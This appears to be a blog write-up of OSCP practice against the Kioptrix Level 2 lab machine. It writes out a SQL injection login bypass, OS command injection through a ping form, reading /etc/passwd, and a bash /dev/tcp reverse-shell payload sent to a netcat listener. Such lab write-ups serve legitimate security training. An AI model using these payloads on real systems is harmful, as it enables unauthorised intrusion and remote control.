Hello everyone! Today I'll be continuing my OSCP preparation with Kioptrix level 2!!


## IP Discovery
As always, let's kick things off with an IP subnet scan with netdiscover
<img width="634" alt="netdiscover" src="https://user-images.githubusercontent.com/15880042/112777778-0bb22480-9011-11eb-9cee-e185291aef41.png">

### nmap
![nmap](https://user-images.githubusercontent.com/15880042/112778445-921b3600-9012-11eb-9971-991a8e2732cf.png)

There's a webserver running on port 80, let's check that one first.

<img width="335" alt="login" src="https://user-images.githubusercontent.com/15880042/114234740-2a87b380-994d-11eb-9e2f-bb887fb367ec.png">

After going through a list of SQL injections, finally found the one that worked!: admin' -- -

After bypassing the login, we're presented with another dialog box to ping a machine on the network.
<img width="614" alt="ping" src="https://user-images.githubusercontent.com/15880042/114235512-4b9cd400-994e-11eb-827d-8957145092d3.png">

Issuing the command.... ;ls -l enumerates the current
directory and we see there are two files: index.php and pingit.php
<img width="398" alt="ls" src="https://user-images.githubusercontent.com/15880042/120052191-0b72dd00-bff2-11eb-8818-19d0b118ff00.png">

Ok, so..we know that we can enumerate the contents of the server hosting this site. Let's see what if we have access to other directories/resources, namely **/etc/passwd**. We have access! And if you look closely, towards the bottom, you will see two usernames! **josh and harold**

![josh_harold](https://user-images.githubusercontent.com/15880042/120052459-6fe26c00-bff3-11eb-9be2-d75ff628129e.png)

So we've revealed a few things. Let's take a few moments to review them:

1 - The input boxes are suspectible to OS command injection

2 - Directory traversal is allowed through OS command injection

3 - Two usernames are josh and harold

Because OS command injection is present, let's see if we can get a reverse shell on the box. Head on over to highoncofee for all your reverse shell needs!

Start your netcat listener

<img width="277" alt="nc" src="https://user-images.githubusercontent.com/15880042/120066243-b95aa780-c043-11eb-8b1c-f486e0a95131.png">

Inject the following into the input box: ;bash -i >& /dev/tcp/192.168.1.142/4444 0>&1

<img width="623" alt="Screen Shot 2021-05-29 at 6 02 02 AM" src="https://user-images.githubusercontent.com/15880042/120066191-6a147700-c043-11eb-9cbc-dcb36ef529a0.png">

Houston we have a shell!!!

<img width="513" alt="shell" src="https://user-images.githubusercontent.com/15880042/120066283-f0c95400-c043-11eb-9773-2e08535d6e19.png">







